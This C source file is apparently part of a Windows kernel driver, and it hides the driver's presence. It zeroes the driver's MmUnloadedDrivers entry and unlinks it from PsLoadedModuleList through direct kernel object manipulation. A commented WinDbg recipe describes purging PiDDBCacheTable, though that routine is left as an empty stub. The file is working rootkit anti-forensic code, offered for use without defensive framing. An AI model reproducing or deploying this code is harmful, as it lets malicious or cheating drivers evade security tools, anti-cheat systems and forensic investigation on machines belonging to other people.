/* nr_stealth.c -- trace removal. See nr_stealth.h for the governing rule:
 * every routine verifies the field before writing, and fails closed. */
#include "nr_stealth.h"

/* MmUnloadedDrivers is an exported array of MM_UNLOADED_DRIVER (50 entries on
 * Win10/11). Its layout has been stable since NT 5.1. PsLoadedModuleList is an
 * exported LIST_ENTRY head. Both are linker-resolved, not scanned. */
typedef struct _MM_UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID          ModuleStart;
    PVOID          ModuleEnd;
} MM_UNLOADED_DRIVER, *PMM_UNLOADED_DRIVER;

#define NR_MAX_UNLOADED 50

extern PMM_UNLOADED_DRIVER MmUnloadedDrivers;
extern LIST_ENTRY          PsLoadedModuleList;

static NR_STEALTH_INFO g_Stealth = { 0 };

VOID NrStealthInit(_In_ PDRIVER_OBJECT DriverObject)
{
    g_Stealth.ImageBase = DriverObject ? DriverObject->DriverStart : NULL;
    g_Stealth.ImageSize = DriverObject ? DriverObject->DriverSize : 0;
}

/* True when 'addr' falls inside our own image, used to identify our list entry
 * without trusting a name string. */
static BOOLEAN NrInOurImage(_In_ PVOID addr)
{
    if (!g_Stealth.ImageBase || !g_Stealth.ImageSize)
        return FALSE;
    return (ULONG_PTR)addr >= (ULONG_PTR)g_Stealth.ImageBase &&
           (ULONG_PTR)addr <  (ULONG_PTR)g_Stealth.ImageBase + g_Stealth.ImageSize;
}

VOID NrStealthEraseUnloaded(VOID)
{
    if (!MmUnloadedDrivers)
        return;

    for (ULONG i = 0; i < NR_MAX_UNLOADED; i++) {
        PMM_UNLOADED_DRIVER entry = &MmUnloadedDrivers[i];

        /* Match on the address range, not the name -- the name can be anything
         * when the driver was mapped rather than installed. */
        if (!entry->ModuleStart && !entry->ModuleEnd)
            continue;
        if (g_Stealth.ImageBase &&
            (ULONG_PTR)entry->ModuleStart <= (ULONG_PTR)g_Stealth.ImageBase &&
            (ULONG_PTR)entry->ModuleEnd   >= (ULONG_PTR)g_Stealth.ImageBase) {
            /* Overwrite the name buffers and clear the range. Any scanner reading
             * this row now sees an empty slot rather than our image. */
            RtlZeroMemory(entry, sizeof(MM_UNLOADED_DRIVER));
        }
    }
}

VOID NrStealthUnlinkLoaded(VOID)
{
    PLIST_ENTRY head = &PsLoadedModuleList;
    PLIST_ENTRY cursor = head->Flink;
    ULONG       guard  = 0;

    /* The list is a kernel global; a corrupt pointer would fault. Walk a bounded
     * number of nodes and stop if the linkage ever looks wrong. */
    while (cursor && cursor != head && guard++ < 512) {
        /* LDR_DATA_TABLE_ENTRY.DllBase sits at a fixed offset in the module
         * entry the kernel keeps; on x64 it is 0x30. FILL if a build moves it. */
        PVOID dllBase = *(PVOID*)((PUCHAR)cursor + 0x30);

        if (NrInOurImage(dllBase)) {
            PLIST_ENTRY next = cursor->Flink;
            PLIST_ENTRY prev = cursor->Blink;
            /* Standard DKOM unlink. Bounded, verified link pair first. */
            if (prev && prev->Flink == cursor) {
                prev->Flink = next;
                next->Blink = prev;
                /* Leave our own node pointing at itself so a stray traversal
                 * cannot walk back into the list through us. */
                cursor->Flink = cursor;
                cursor->Blink = cursor;
            }
            return;
        }
        cursor = cursor->Flink;
    }
}

VOID NrStealthEraseDdb(VOID)
{
    /* PiDDBCacheTable is not exported and its offsets move between builds.
     *
     * recipe (WinDbg on the exact target build):
     *   1. x nt!PiDDBCacheTable              -> address of the table
     *   2. dt nt!_RTL_AVL_TABLE / the entry struct to confirm ElementSize
     *   3. the table is a generic AVL table keyed by {TimeDateStamp, Name};
     *      walk RtlEnumerateGenericTableAvl and delete entries whose Name
     *      matches our driver's service name.
     *
     * Deliberately not guessed here: writing to the wrong kernel address is
     * exactly the failure that turns a stealth pass into a bugcheck. Resolve on
     * your build, then implement against the resolved symbol. */
    return;
}
